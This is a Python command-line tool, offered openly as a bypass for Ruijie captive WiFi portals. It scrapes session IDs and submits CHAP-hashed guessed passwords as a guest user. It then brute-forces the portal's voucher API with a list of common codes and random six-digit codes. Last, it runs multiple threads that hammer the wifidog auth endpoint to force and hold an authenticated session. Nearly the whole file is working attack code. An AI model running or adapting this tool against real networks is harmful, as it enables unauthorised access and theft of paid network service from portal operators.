#!/usr/bin/env python3
"""
Ruijie WiFi Portal Tool - Bypass using MAC auth + wifidog keepalive
Based on reverse-engineered core.so + working community scripts.
"""

import argparse
import hashlib
import logging
import random
import re
import signal
import string
import sys
import threading
import time
from urllib.parse import urljoin, urlparse, parse_qs, unquote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ruijie")

BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""

COMMON_CODES = [
    "123456", "000000", "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888", "999999", "123123",
    "121212", "654321", "12345678", "00000000", "66666666",
    "88888888", "1234", "0000", "1111", "2222", "3333",
]


def chap_md5(chap_id: str, password: str, challenge: str) -> str:
    try:
        mid = bytes.fromhex(chap_id) if re.match(r'^[0-9a-f]{2}$', chap_id, re.I) else chap_id.encode()
    except ValueError:
        mid = chap_id.encode()
    try:
        ch = bytes.fromhex(challenge) if re.match(r'^[0-9a-f]{32}$', challenge, re.I) else challenge.encode()
    except ValueError:
        ch = challenge.encode()
    m = hashlib.md5()
    m.update(mid)
    m.update(password.encode())
    m.update(ch)
    return m.hexdigest().lower()


def parse_octal_escapes(s: str) -> bytes:
    out = bytearray()
    i = 0
    while i < len(s):
        if s[i] == '\\' and i + 3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8))
            i += 4
        else:
            out.append(ord(s[i]))
            i += 1
    return bytes(out)


def check_internet():
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3)
        return r.status_code == 204
    except Exception:
        return False


def extract_sid(url_str, html):
    m = re.search(r'sessionId=([a-f0-9]{32})', url_str)
    if m:
        return m.group(1)
    m = re.search(r'sessionId=([a-f0-9]{32})', html)
    if m:
        return m.group(1)
    m = re.search(r'sessionId["\']?\s*[=:]\s*["\']?([a-f0-9]{32})', html)
    if m:
        return m.group(1)
    return None


def follow_redirects(sess, url, max_hops=10):
    current = url
    for hop in range(max_hops):
        r = sess.get(current, verify=False, timeout=10)
        html = r.text
        final_url = str(r.url)

        # Check if we already have sessionId
        if extract_sid(final_url, html):
            return r, html, final_url

        # Meta refresh
        m = re.search(
            r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;?\s*url=([^"\' >]+)',
            html, re.I
        )
        if m:
            next_url = urljoin(final_url, m.group(1))
            log.debug(f"  meta refresh -> {next_url}")
            current = next_url
            continue

        # JS redirect
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", html)
        if m:
            next_url = urljoin(final_url, m.group(1).replace("&amp;", "&"))
            log.debug(f"  JS redirect -> {next_url}")
            current = next_url
            continue

        # No more redirects
        return r, html, final_url

    return sess.get(current, verify=False, timeout=10), "", current


def ping_wifidog(auth_url, interval=0.1):
    s = requests.Session()
    while True:
        try:
            s.get(auth_url, timeout=5)
        except Exception:
            break
        time.sleep(interval)


def run(ping_threads=5, ping_interval=0.1, access_code=""):
    log.info("Starting Ruijie bypass...")
    sess = requests.Session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    sess.verify = False

    while True:
        try:
            # 1. Detect portal via redirect
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=True, timeout=5)
            if r.status_code == 204:
                if check_internet():
                    log.info("[*] Already online")
                    time.sleep(10)
                    continue
                time.sleep(3)
                continue

            portal_url = r.url
            log.info(f"[*] Portal: {portal_url}")

            # 2. Follow redirect chain to find maccauth/login page
            r, html, final_url = follow_redirects(sess, portal_url)
            log.info(f"[*] Final URL: {final_url}")

            # 3. Extract sessionId
            sid = extract_sid(final_url, html)
            if not sid:
                log.warning("[!] No sessionId found, trying fallback...")
                sid = "00000000000000000000000000000000"

            log.info(f"[*] SID: {sid}")

            # 4. Parse gateway info from FIRST portal URL
            params = parse_qs(urlparse(portal_url).query)
            gw_addr = params.get("gw_address", ["192.168.110.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]
            gw_id = params.get("gw_id", [""])[0]
            gw_sn = params.get("gw_sn", [""])[0]
            mac = params.get("mac", [""])[0]
            client_ip = params.get("ip", [""])[0]
            chap_id_raw = params.get("chap_id", [None])[0]
            chap_chal_raw = params.get("chap_challenge", [None])[0]

            log.info(f"[*] Gateway: {gw_addr}:{gw_port}")
            log.info(f"[*] MAC: {mac}")
            log.info(f"[*] IP: {client_ip}")

            # 5. Try CHAP auth if challenge present
            if chap_chal_raw:
                log.info("[*] Trying CHAP-based auth...")
                chap_id = unquote(chap_id_raw) if chap_id_raw else "01"
                chap_chal = unquote(chap_chal_raw)
                pwd = access_code or "123456"
                pwd_hash = chap_md5(chap_id, pwd, chap_chal)
                log.info(f"  CHAP id={chap_id} hash={pwd_hash[:16]}...")

                auth_url = f"{urlparse(portal_url).scheme}://{urlparse(portal_url).netloc}/auth/wifidogAuth/login/"
                form_data = {
                    "auth_type": "PAP",
                    "username": "guest",
                    "password": pwd_hash,
                    "sessionId": sid,
                    "gw_id": gw_id,
                    "gw_sn": gw_sn,
                    "gw_address": gw_addr,
                    "gw_port": gw_port,
                    "ip": client_ip,
                    "mac": mac,
                    "url": "http://connectivitycheck.gstatic.com/generate_204",
                }
                try:
                    rr = sess.post(auth_url, data=form_data, timeout=10, allow_redirects=False)
                    log.info(f"  CHAP auth: {rr.status_code} -> {rr.headers.get('Location', 'none')}")
                    if rr.status_code in (302, 301):
                        loc = rr.headers["Location"]
                        if "token=" in loc or "success" in loc.lower():
                            log.info("[+] CHAP auth successful!")
                            sess.get(loc, timeout=5)
                except Exception as e:
                    log.warning(f"  CHAP auth error: {e}")

            # 6. Try voucher API with multiple codes
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            voucher_api = f"{portal_host}/api/auth/voucher/"

            codes_to_try = [access_code] if access_code else []
            codes_to_try += COMMON_CODES
            codes_to_try += [str(random.randint(100000, 999999)) for _ in range(20)]

            for code in codes_to_try:
                try:
                    payload = {
                        "accessCode": code,
                        "sessionId": sid,
                        "apiVersion": 1,
                    }
                    v = sess.post(voucher_api, json=payload, timeout=5)
                    resp = v.json() if v.headers.get("content-type", "").startswith("application/json") else {}
                    success = resp.get("success") or resp.get("status") == "ok" or resp.get("code") == 0
                    if v.status_code == 200 and success:
                        log.info(f"[+] Voucher accepted! Code: {code}")
                        access_code = code
                        break
                    if v.status_code == 200 and not success:
                        log.info(f"  Voucher {code}: {resp}")
                except Exception:
                    continue
            else:
                log.info("[*] No valid voucher found, continuing anyway...")

            # 7. Start wifidog keepalive pings
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth"
            params_str = f"?token={sid}&mac={mac}&ip={client_ip}"
            if gw_id:
                params_str += f"&gw_id={gw_id}"

            full_auth_url = auth_link + params_str
            log.info(f"[*] Pinging: {auth_link}")
            log.info(f"[*] Starting {ping_threads} threads...")

            for _ in range(ping_threads):
                t = threading.Thread(
                    target=ping_wifidog,
                    args=(full_auth_url, ping_interval),
                    daemon=True,
                )
                t.start()

            # 8. Verify
            log.info("[*] Verifying...")
            for i in range(10):
                time.sleep(2)
                if check_internet():
                    log.info("[+] ONLINE! Keeping session alive...")
                    while check_internet():
                        time.sleep(5)
                    log.warning("[-] Disconnected, retrying...")
                    break
            else:
                log.warning("[-] Bypass not working yet, retrying...")
                time.sleep(3)

        except KeyboardInterrupt:
            log.info("Stopped")
            break
        except Exception as e:
            log.warning(f"[!] {e}")
            time.sleep(5)


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Ruijie WiFi Portal Tool")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Ping threads")
    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Ping interval (s)")
    parser.add_argument("-c", "--code", type=str, default="", help="Known access code")
    args = parser.parse_args()

    def sigint(sig, frame):
        log.info("Stopped")
        sys.exit(0)
    signal.signal(signal.SIGINT, sigint)
    run(ping_threads=args.threads, ping_interval=args.interval, access_code=args.code)


if __name__ == "__main__":
    main()
